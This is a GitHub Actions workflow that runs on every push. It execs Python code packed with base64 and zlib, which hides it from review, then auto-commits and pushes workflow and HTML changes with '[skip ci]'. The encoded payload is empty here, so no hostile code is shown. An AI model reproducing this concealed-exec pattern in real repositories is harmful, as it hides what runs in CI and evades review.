name: Apply reference search runner

on: push

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Add reference search
        run: python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')).decode())"
      - name: Commit changes
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add references.html .github/workflows/add-reference-search.yml .github/workflows/apply-reference-search.yml .github/workflows/apply-reference-search2.yml .reference-search-trigger
          git commit -m 'Add live search to reporting references [skip ci]' || exit 0
          git push
